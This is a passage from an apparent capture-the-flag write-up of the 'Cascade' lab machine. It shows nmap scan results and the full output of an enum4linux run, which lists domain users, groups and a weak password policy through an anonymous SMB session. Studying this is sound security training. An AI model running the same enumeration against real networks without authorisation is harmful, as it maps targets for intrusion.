class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="no">Professional</span> <span class="ow">or</span> <span class="no">Windows</span> <span class="mi">8</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="no">SP1</span> <span class="ow">or</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="no">SP1</span> <span class="ow">or</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">SP2</span> <span class="ow">or</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="no">SP1</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">)</span>
<span class="no">No</span> <span class="n">exact</span> <span class="no">OS</span> <span class="n">matches</span> <span class="k">for</span> <span class="n">host</span> <span class="p">(</span><span class="nb">test</span> <span class="n">conditions</span> <span class="n">non</span><span class="o">-</span><span class="n">ideal</span><span class="p">)</span><span class="o">.</span>
<span class="no">TCP</span><span class="o">/</span><span class="no">IP</span> <span class="ss">fingerprint:
</span><span class="no">SCAN</span><span class="p">(</span><span class="no">V</span><span class="o">=</span><span class="mf">7.80</span><span class="o">%</span><span class="no">E</span><span class="o">=</span><span class="mi">4</span><span class="o">%</span><span class="no">D</span><span class="o">=</span><span class="mi">7</span><span class="o">/</span><span class="mi">23</span><span class="o">%</span><span class="no">OT</span><span class="o">=</span><span class="mi">53</span><span class="o">%</span><span class="no">CT</span><span class="o">=%</span><span class="no">CU</span><span class="o">=%</span><span class="no">PV</span><span class="o">=</span><span class="no">Y</span><span class="o">%</span><span class="no">DS</span><span class="o">=</span><span class="mi">2</span><span class="o">%</span><span class="no">DC</span><span class="o">=</span><span class="no">T</span><span class="o">%</span><span class="no">G</span><span class="o">=</span><span class="no">N</span><span class="o">%</span><span class="no">TM</span><span class="o">=</span><span class="mi">5</span><span class="no">F193499</span><span class="o">%</span><span class="no">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="p">)</span>
<span class="no">SEQ</span><span class="p">(</span><span class="no">SP</span><span class="o">=</span><span class="mi">106</span><span class="o">%</span><span class="no">GCD</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="no">ISR</span><span class="o">=</span><span class="mi">10</span><span class="no">C</span><span class="o">%</span><span class="no">TI</span><span class="o">=</span><span class="no">I</span><span class="o">%</span><span class="no">II</span><span class="o">=</span><span class="no">I</span><span class="o">%</span><span class="no">TS</span><span class="o">=</span><span class="mi">7</span><span class="p">)</span>
<span class="no">OPS</span><span class="p">(</span><span class="no">O1</span><span class="o">=</span><span class="no">M54DNW8ST11</span><span class="o">%</span><span class="no">O2</span><span class="o">=</span><span class="no">M54DNW8ST11</span><span class="o">%</span><span class="no">O3</span><span class="o">=</span><span class="no">M54DNW8NNT11</span><span class="o">%</span><span class="no">O4</span><span class="o">=</span><span class="no">M54DNW8ST11</span><span class="o">%</span><span class="no">O5</span><span class="o">=</span><span class="no">M54DNW8ST11</span><span class="o">%</span><span class="no">O6</span><span class="o">=</span><span class="no">M54DST11</span><span class="p">)</span>
<span class="no">WIN</span><span class="p">(</span><span class="no">W1</span><span class="o">=</span><span class="mi">2000</span><span class="o">%</span><span class="no">W2</span><span class="o">=</span><span class="mi">2000</span><span class="o">%</span><span class="no">W3</span><span class="o">=</span><span class="mi">2000</span><span class="o">%</span><span class="no">W4</span><span class="o">=</span><span class="mi">2000</span><span class="o">%</span><span class="no">W5</span><span class="o">=</span><span class="mi">2000</span><span class="o">%</span><span class="no">W6</span><span class="o">=</span><span class="mi">2000</span><span class="p">)</span>
<span class="no">ECN</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">Y</span><span class="o">%</span><span class="no">DF</span><span class="o">=</span><span class="no">Y</span><span class="o">%</span><span class="no">TG</span><span class="o">=</span><span class="mi">80</span><span class="o">%</span><span class="no">W</span><span class="o">=</span><span class="mi">2000</span><span class="o">%</span><span class="no">O</span><span class="o">=</span><span class="no">M54DNW8NNS</span><span class="o">%</span><span class="no">CC</span><span class="o">=</span><span class="no">N</span><span class="o">%</span><span class="no">Q</span><span class="o">=</span><span class="p">)</span>
<span class="no">T1</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">Y</span><span class="o">%</span><span class="no">DF</span><span class="o">=</span><span class="no">Y</span><span class="o">%</span><span class="no">TG</span><span class="o">=</span><span class="mi">80</span><span class="o">%</span><span class="no">S</span><span class="o">=</span><span class="no">O</span><span class="o">%</span><span class="no">A</span><span class="o">=</span><span class="no">S</span><span class="o">+%</span><span class="no">F</span><span class="o">=</span><span class="no">AS</span><span class="o">%</span><span class="no">RD</span><span class="o">=</span><span class="mi">0</span><span class="o">%</span><span class="no">Q</span><span class="o">=</span><span class="p">)</span>
<span class="no">T2</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">N</span><span class="p">)</span>
<span class="no">T3</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">N</span><span class="p">)</span>
<span class="no">T4</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">N</span><span class="p">)</span>
<span class="no">U1</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">N</span><span class="p">)</span>
<span class="no">IE</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">Y</span><span class="o">%</span><span class="no">DFI</span><span class="o">=</span><span class="no">N</span><span class="o">%</span><span class="no">TG</span><span class="o">=</span><span class="mi">80</span><span class="o">%</span><span class="no">CD</span><span class="o">=</span><span class="no">Z</span><span class="p">)</span>

<span class="no">Uptime</span> <span class="ss">guess: </span><span class="mf">0.479</span> <span class="n">days</span> <span class="p">(</span><span class="n">since</span> <span class="no">Wed</span> <span class="no">Jul</span> <span class="mi">22</span> <span class="mi">15</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">52</span> <span class="mi">2020</span><span class="p">)</span>
<span class="no">Network</span> <span class="no">Distance</span><span class="p">:</span> <span class="mi">2</span> <span class="n">hops</span>
<span class="no">TCP</span> <span class="no">Sequence</span> <span class="no">Prediction</span><span class="p">:</span> <span class="no">Difficulty</span><span class="o">=</span><span class="mi">253</span> <span class="p">(</span><span class="no">Good</span> <span class="n">luck!</span><span class="p">)</span>
<span class="no">IP</span> <span class="no">ID</span> <span class="no">Sequence</span> <span class="no">Generation</span><span class="p">:</span> <span class="no">Incremental</span>
<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">Host</span><span class="p">:</span> <span class="no">CASC</span><span class="o">-</span><span class="no">DC1</span><span class="p">;</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Windows</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_server_2008:r2:sp1</span><span class="p">,</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows</span>

<span class="no">Host</span> <span class="n">script</span> <span class="ss">results:
</span><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="ss">skew: </span><span class="mi">3</span><span class="n">m22s</span>
<span class="o">|</span> <span class="n">p2p</span><span class="o">-</span><span class="ss">conficker: 
</span><span class="o">|</span>   <span class="no">Checking</span> <span class="k">for</span> <span class="no">Conficker</span><span class="o">.</span><span class="no">C</span> <span class="ow">or</span> <span class="n">higher</span><span class="o">...</span>
<span class="o">|</span>   <span class="no">Check</span> <span class="mi">1</span> <span class="p">(</span><span class="n">port</span> <span class="mi">62331</span><span class="o">/</span><span class="n">tcp</span><span class="p">):</span> <span class="no">CLEAN</span> <span class="p">(</span><span class="no">Timeout</span><span class="p">)</span>
<span class="o">|</span>   <span class="no">Check</span> <span class="mi">2</span> <span class="p">(</span><span class="n">port</span> <span class="mi">51409</span><span class="o">/</span><span class="n">tcp</span><span class="p">):</span> <span class="no">CLEAN</span> <span class="p">(</span><span class="no">Timeout</span><span class="p">)</span>
<span class="o">|</span>   <span class="no">Check</span> <span class="mi">3</span> <span class="p">(</span><span class="n">port</span> <span class="mi">10882</span><span class="o">/</span><span class="n">udp</span><span class="p">):</span> <span class="no">CLEAN</span> <span class="p">(</span><span class="no">Timeout</span><span class="p">)</span>
<span class="o">|</span>   <span class="no">Check</span> <span class="mi">4</span> <span class="p">(</span><span class="n">port</span> <span class="mi">53799</span><span class="o">/</span><span class="n">udp</span><span class="p">):</span> <span class="no">CLEAN</span> <span class="p">(</span><span class="no">Timeout</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">0</span><span class="o">/</span><span class="mi">4</span> <span class="n">checks</span> <span class="n">are</span> <span class="ss">positive: </span><span class="no">Host</span> <span class="n">is</span> <span class="no">CLEAN</span> <span class="ow">or</span> <span class="n">ports</span> <span class="n">are</span> <span class="n">blocked</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="ss">mode: 
</span><span class="o">|</span>   <span class="mf">2.02</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>    <span class="no">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="ow">and</span> <span class="n">required</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="ss">time: 
</span><span class="o">|</span>   <span class="ss">date: </span><span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">23</span><span class="no">T06</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">09</span>
<span class="o">|</span><span class="n">_</span>  <span class="ss">start_date: </span><span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">22</span><span class="no">T19</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">40</span>

<span class="no">TRACEROUTE</span> <span class="p">(</span><span class="n">using</span> <span class="n">port</span> <span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span>
<span class="no">HOP</span> <span class="no">RTT</span>       <span class="no">ADDRESS</span>
<span class="mi">1</span>   <span class="mf">184.36</span> <span class="n">ms</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.1</span>
<span class="mi">2</span>   <span class="mf">184.52</span> <span class="n">ms</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span><span class="p">)</span>

<span class="no">NSE</span><span class="p">:</span> <span class="no">Script</span> <span class="no">Post</span><span class="o">-</span><span class="n">scanning</span><span class="o">.</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">1</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">2</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">3</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="ss">from: </span><span class="sr">/usr/</span><span class="n">bin</span><span class="o">/..</span><span class="sr">/share/nm</span><span class="n">ap</span>
<span class="no">OS</span> <span class="ow">and</span> <span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">248.12</span> <span class="n">seconds</span>
           <span class="no">Raw</span> <span class="n">packets</span> <span class="ss">sent: </span><span class="mi">2074</span> <span class="p">(</span><span class="mf">94.964</span><span class="no">KB</span><span class="p">)</span> <span class="o">|</span> <span class="no">Rcvd</span><span class="p">:</span> <span class="mi">144</span> <span class="p">(</span><span class="mf">20.275</span><span class="no">KB</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="enum4linux">Enum4linux</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">enum4linux</span> <span class="o">-</span><span class="n">a</span> <span class="n">cascade</span><span class="p">.</span><span class="n">htb</span>
<span class="n">Starting</span> <span class="n">enum4linux</span> <span class="n">v0</span><span class="p">.</span><span class="mf">8.9</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">labs</span><span class="p">.</span><span class="n">portcullis</span><span class="p">.</span><span class="n">co</span><span class="p">.</span><span class="n">uk</span><span class="o">/</span><span class="n">application</span><span class="o">/</span><span class="n">enum4linux</span><span class="o">/</span> <span class="p">)</span> <span class="n">on</span> <span class="n">Thu</span> <span class="n">Jul</span> <span class="mi">23</span> <span class="mi">02</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">55</span> <span class="mi">2020</span>

 <span class="o">==========================</span> 
<span class="o">|</span>    <span class="n">Target</span> <span class="n">Information</span>    <span class="o">|</span>
 <span class="o">==========================</span> 
<span class="n">Target</span> <span class="p">...........</span> <span class="n">cascade</span><span class="p">.</span><span class="n">htb</span>
<span class="n">RID</span> <span class="n">Range</span> <span class="p">........</span> <span class="mi">500</span><span class="o">-</span><span class="mi">550</span><span class="p">,</span><span class="mi">1000</span><span class="o">-</span><span class="mi">1050</span>
<span class="n">Username</span> <span class="p">.........</span> <span class="sh">''</span>
<span class="n">Password</span> <span class="p">.........</span> <span class="sh">''</span>
<span class="n">Known</span> <span class="n">Usernames</span> <span class="p">..</span> <span class="n">administrator</span><span class="p">,</span> <span class="n">guest</span><span class="p">,</span> <span class="n">krbtgt</span><span class="p">,</span> <span class="n">domain</span> <span class="n">admins</span><span class="p">,</span> <span class="n">root</span><span class="p">,</span> <span class="nb">bin</span><span class="p">,</span> <span class="n">none</span>


 <span class="o">===================================================</span> 
<span class="o">|</span>    <span class="n">Enumerating</span> <span class="n">Workgroup</span><span class="o">/</span><span class="n">Domain</span> <span class="n">on</span> <span class="n">cascade</span><span class="p">.</span><span class="n">htb</span>    <span class="o">|</span>
 <span class="o">===================================================</span> 
<span class="p">[</span><span class="n">E</span><span class="p">]</span> <span class="n">Can</span><span class="sh">'</span><span class="s">t find workgroup/domain


 =========================================== 
|    Nbtstat Information for cascade.htb    |
 =========================================== 
Looking up status of 10.10.10.182
No reply from 10.10.10.182

 ==================================== 
|    Session Check on cascade.htb    |
 ==================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server cascade.htb allows sessions using username </span><span class="sh">''</span><span class="s">, password </span><span class="sh">''</span><span class="s">
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ========================================== 
|    Getting domain SID for cascade.htb    |
 ========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: CASCADE
Domain Sid: S-1-5-21-3332504370-1206983947-1165150453
[+] Host is part of a domain (not a workgroup)

 ===================================== 
|    OS information on cascade.htb    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for cascade.htb from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for cascade.htb from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================ 
|    Users on cascade.htb    |
 ============================ 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull     Name: Adrian Turnbull   Desc: (null)
index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc Name: ArkSvc    Desc: (null)
index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson       Name: Ben Hanson        Desc: (null)
index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc      Name: BackupSvc Desc: (null)
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest      Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman       Name: David Burman      Desc: (null)
index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe        Name: Edward Crowe      Desc: (null)
index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft        Name: Ian Croft Desc: (null)
index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen        Name: Joseph Allen      Desc: (null)
index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand     Name: John Goodhand     Desc: (null)
index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield    Name: James Wakefield   Desc: (null)
index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson     Name: Ryan Thompson     Desc: (null)
index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson      Name: Stephanie Hickson Desc: (null)
index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith        Name: Steve Smith       Desc: (null)
index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util   Name: Util      Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]

 ======================================== 
|    Share Enumeration on cascade.htb    |
 ======================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on cascade.htb

 =================================================== 
|    Password Policy Information for cascade.htb    |
 =================================================== 


[+] Attaching to cascade.htb using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] CASCADE
        [+] Builtin

[+] Password Info for Domain: CASCADE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================= 
|    Groups on cascade.htb    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group </span><span class="sh">'</span><span class="n">Pre</span><span class="o">-</span><span class="n">Windows</span> <span class="mi">2000</span> <span class="n">Compatible</span> <span class="n">Access</span><span class="sh">'</span><span class="s"> (RID: 554) has member: NT AUTHORITY\Authenticated Users
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group </span><span class="sh">'</span><span class="n">Guests</span><span class="sh">'</span><span class="s"> (RID: 546) has member: CASCADE\CascGuest
Group </span><span class="sh">'</span><span class="n">Guests</span><span class="sh">'</span><span class="s"> (RID: 546) has member: CASCADE\Domain Guests
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group </span><span class="sh">'</span><span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group </span><span class="sh">'</span><span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 545) has member: NT AUTHORITY\Authenticated Users
Group </span><span class="sh">'</span><span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 545) has member: CASCADE\Domain Users
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group </span><span class="sh">'</span><span class="n">Windows</span> <span class="n">Authorization</span> <span class="n">Access</span> <span class="n">Group</span><span class="sh">'</span><span class="s"> (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44e]
group:[IT] rid:[0x459]
group:[Production] rid:[0x45a]
group:[HR] rid:[0x45b]
group:[AD Recycle Bin] rid:[0x45f]
group:[Backup] rid:[0x460]
group:[Temps] rid:[0x463]
group:[WinRMRemoteWMIUsers__] rid:[0x465]
group:[Remote Management Users] rid:[0x466]
group:[Factory] rid:[0x46c]
group:[Finance] rid:[0x46d]
group:[Audit Share] rid:[0x471]
group:[Data Share] rid:[0x472]

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group </span><span class="sh">'</span><span class="n">HR</span><span class="sh">'</span><span class="s"> (RID: 1115) has member: CASCADE\s.hickson
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group </span><span class="sh">'</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="sh">'</span><span class="s"> (RID: 572) has member: CASCADE\krbtgt
Group </span><span class="sh">'</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="sh">'</span><span class="s"> (RID: 572) has member: CASCADE\Domain Controllers
Group </span><span class="sh">'</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="sh">'</span><span class="s"> (RID: 572) has member: CASCADE\Schema Admins
Group </span><span class="sh">'</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="sh">'</span><span class="s"> (RID: 572) has member: CASCADE\Enterprise Admins
Group </span><span class="sh">'</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="sh">'</span><span class="s"> (RID: 572) has member: CASCADE\Cert Publishers
Group </span><span class="sh">'</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="sh">'</span><span class="s"> (RID: 572) has member: CASCADE\Domain Admins
Group </span><span class="sh">'</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="sh">'</span><span class="s"> (RID: 572) has member: CASCADE\Group Policy Creator Owners
Group </span><span class="sh">'</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="sh">'</span><span class="s"> (RID: 572) has member: CASCADE\Read-only Domain Controllers
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group </span><span class="sh">'</span><span class="n">IT</span><span class="sh">'</span><span class="s"> (RID: 1113) has member: CASCADE</span><span class="se">\a</span><span class="s">rksvc
Group </span><span class="sh">'</span><span class="n">IT</span><span class="sh">'</span><span class="s"> (RID: 1113) has member: CASCADE\s.smith
Group </span><span class="sh">'</span><span class="n">IT</span><span class="sh">'</span><span class="s"> (RID: 1113) has member: CASCADE</span><span class="se">\r</span><span class="s">.thompson
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group </span><span class="sh">'</span><span class="n">Data</span> <span class="n">Share</span><span class="sh">'</span><span class="s"> (RID: 1138) has member: CASCADE\Domain Users
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group </span><span class="sh">'</span><span class="n">Audit</span> <span class="n">Share</span><span class="sh">'</span><span class="s"> (RID: 1137) has member: CASCADE\s.smith
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group </span><span class="sh">'</span><span class="n">Remote</span> <span class="n">Management</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 1126) has member: CASCADE</span><span class="se">\a</span><span class="s">rksvc
Group </span><span class="sh">'</span><span class="n">Remote</span> <span class="n">Management</span> <span class="n">Users</span><span class="sh">'</span><span class="s"> (RID: 1126) has member: CASCADE\s.smith
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
